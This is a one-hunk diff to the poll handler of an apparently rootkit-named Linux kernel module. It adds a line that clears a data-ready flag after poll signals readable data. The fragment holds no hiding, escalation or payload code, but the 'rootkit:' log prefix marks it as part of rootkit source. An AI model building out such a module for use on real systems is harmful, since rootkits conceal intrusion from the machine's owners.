@@ -78,6 +78,7 @@ static unsigned int dev_poll(struct file *file, poll_table *wait) {
     // you should return POLLIN | POLLRDNORM if you have some new data to read, and 0 in case there is no new data to read
     if (data_ready) {
         printk(KERN_INFO "rootkit: Data ready!");
+        data_ready = 0;
         return POLLIN | POLLRDNORM;
     }
     printk(KERN_INFO "rootkit: Poll return 0");
